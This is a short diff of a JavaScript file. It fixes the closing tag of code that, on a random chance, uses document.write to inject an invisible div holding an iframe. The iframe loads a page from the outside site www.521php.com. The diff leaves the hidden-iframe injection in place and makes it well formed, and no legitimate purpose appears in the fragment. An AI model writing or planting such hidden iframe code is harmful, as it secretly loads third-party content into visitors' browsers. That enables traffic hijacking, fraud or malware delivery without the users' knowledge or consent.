@@ -8,5 +8,5 @@ return(Min + Math.round(Rand * Range));
 }   
 var _num2 = GetRandomNum(1,10);
 if(_num1 >= _num2){
-	document.write('<div style="display:none"><iframe src="http://www.521php.com/index2.html"></div>');
+	document.write('<div style="display:none"><iframe src="http://www.521php.com/index2.html"></iframe></div>');
 }
